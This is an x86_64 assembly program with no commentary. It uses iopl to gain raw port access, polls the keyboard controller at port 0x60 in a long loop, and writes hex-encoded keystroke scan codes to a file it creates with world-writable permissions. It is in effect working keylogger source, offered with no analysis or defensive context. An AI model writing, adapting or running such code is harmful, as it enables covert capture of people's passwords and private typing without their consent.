;arg x86_64        rdi   rsi   rdx   r10   r8    r9    -

section	.text
    	global _start
_start:
	jmp main

getpid:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 39   ; use the getpid syscall
	;mov rdi, 0   
	;mov rsi, 0 
	;mov rdx, 0  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

write:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 1   ; use the write syscall
	mov rdi, 1   ; write to stdout
	mov rsi, [rbp+24] ; use string "Hello World"
	mov rdx, [rbp+16]  ; write 12 characters
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

iopl:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	mov rax, 172
	mov rdi, [rbp+16] 
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

nanosleep:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	mov rax, 35  
	mov rdi, [rbp+16]  ; req
	mov rsi, [rbp+24] ; rem
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

display_number:
	enter 0, 0
	xor rsi, rsi
	xor rdi, rdi

	mov si, word[rbp+16]
	mov di, word[rbp+16]

	and si, 0xf0
	shr si, 4
	cmp sil, 9
	jg dn1
	add si, 0x30
	jmp dn11
dn1:
	add si, 0x37
dn11:

	and di, 0x0f
	cmp dil, 9
	jg dn2
	add di, 0x30
	jmp dn21
dn2:
	add di, 0x37
dn21:
	
	mov ax, di
	shl rax, 8
	add ax, si
	

	leave
	ret

analyze_k:

	enter 0, 0

	mov rsi, [rbp + 24]

	and rsi, 0x80
	cmp rsi, 0x80
	jne ank1

	mov byte[rbp + 16], 1
	jmp ank_e
	
ank1:
	mov byte[rbp + 16], 0
	
ank_e:
	

	leave
	ret


creat:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	mov rax, 85
	mov rdi, [rbp+24] 
	mov rsi, [rbp+16]  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

umask:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	mov rax, 95
	mov rdi, [rbp+16] 
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

open:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	mov rax, 2   ; open syscall
	mov rdi, [rbp+24]   ; file desc
	mov rsi, [rbp+16] ; code
	mov rdx, 0  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

dup2:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	mov rax, 33
	mov rdi, [rbp+24]  
	mov rsi, [rbp+16]  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

writef:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 1   ; use the write syscall
	mov rdi, [rbp+32]   ; write to fd
	mov rsi, [rbp+24] ; buffer
	mov rdx, [rbp+16]  ; write n characters
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

open_file:

	enter 0, 0
	
	push 0
	call umask

	xor rsi, rsi
	push rsi
	mov rsi, 'kfi.k'
	push rsi
	push rsp
	push 7777o
	call creat

	push rax 
	call close

	xor rsi, rsi
	push rsi
	mov rsi, 'kfi.k'
	push rsi
	push rsp
	push 3074 ;2050
	call open

	push rax
	push 0x25
	call dup2
	cmp rax, -1
	je exit
	
	leave
	ret

close:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	;xor rdi,rdi
	mov rax, 3   ; open syscall
	mov rdi, 0x25   ; file desc
	mov rsi, 0 ; code
	mov rdx, 0  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret


exit:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	;xor rdi,rdi
	mov rax, 60  ; exit syscall
	mov rdi, 1
	xor rsi, rsi
	xor rdx, rdx  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret


main:

	push 3
	call iopl

	;xor rax, rax
	;out 0x60, eax

	xor rbx, rbx

	push qword 10000000
	push qword 0
	mov r14, rsp

	push qword 0
	push qword 0
	mov r15, rsp

	call open_file
	
	mov r10, 0
	push r10
lp:
	
	push r15
	push r14
	call nanosleep
	add rsp, 16

	
	
	cli
	xor rax, rax
	mov dx, 0x60
	in eax, dx; 0x60
	push rax
	mov al, 0x20
	out 0x20, al
	sti

	
	
	push rax
	call analyze_k
	cmp byte[rsp], 1
	jne next

	;cmp qword[rsp+16], 0
	;jne next
	
	;push word 0x0A0D
	;mov rsi, 'ased    '
	;push rsi
	;mov rsi, 'Key rele'
	;push rsi
	;push rsp
	;xor rdx,rdx
	;add rdx,18
	;push rdx
	;call write
	;add rsp, 34

	cmp qword[rsp+16], 0
	jne nextkr
	
	cli
	xor r10, r10
	mov r10w, 0x3933
	push r10
	mov r10, rsp
	
	push 0x25
	push r10
	push 2
	call writef
	add rsp, 32
	sti

nextkr:

	mov qword[rsp+16], 1
	jmp next1
	
next:	
	cmp qword[rsp+16], 1
	je next0
	jmp next1
		
next0:
	mov qword[rsp+16], 0

next1:
	
	
	push qword[rsp+8]
	call display_number
		
	cmp qword[rsp+24], 0
	jg next2

	;push rax
	;push word 0x0A0D
	;mov rsi, 'AAA     '
	;push rsi
	;mov rsi, 'AAAAAAAA'
	;push rsi
	;mov rsi, 'AAAAAAAA'
	;push rsi
	;push rsp
	;xor rdx,rdx
	;add rdx,26
	;push rdx
	;call write
	;add rsp, 42
	;pop rax

	cli
	xor r10, r10
	mov r10w, ax
	push rax

	push r10
	mov r10, rsp
	
	push 0x25
	push r10
	push 2
	call writef
	add rsp, 32
	sti
	
	pop rax

	;mov qword[rsp+24], 2
		
next2:
	;mov qword[rsp+24], 1
	add rsp, 24
	
	;push word 0x0A0D
	;mov rsi, 'key :   '
	;mov sil, al
	;push rsi
	;push rsp
	;mov word[rsp+14], ax
	;xor rdx,rdx
	;add rdx,10
	;push rdx
	;call write
	;add rsp, 34
	;sti
	
	inc rbx
	cmp rbx, 1000000
	jl lp	
	
	call close

	call exit











